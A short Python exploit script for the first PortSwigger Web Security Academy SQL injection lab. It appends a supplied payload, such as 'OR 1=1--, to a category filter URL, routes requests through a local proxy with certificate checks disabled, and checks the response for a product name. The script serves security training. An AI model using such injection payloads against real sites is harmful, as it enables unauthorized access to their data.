# Portswigger SQLi labs 1
# http://portswigger.net/web-security/sql-injection

# Usage
#! python3 lab1.py <url> "<payload>"

# Example Usage
#! python3 lab1.py https://0a2c0028042db5258d19a2c2002900eb.web-security-academy.net "'OR 1=1--"

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}


def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)

    # Check if the response contains the string "Cat Grin" to determine if the SQL injection is successful
    if "Cat Grin" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    # Call the exploit_sqli function with the provided URL and payload
    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")
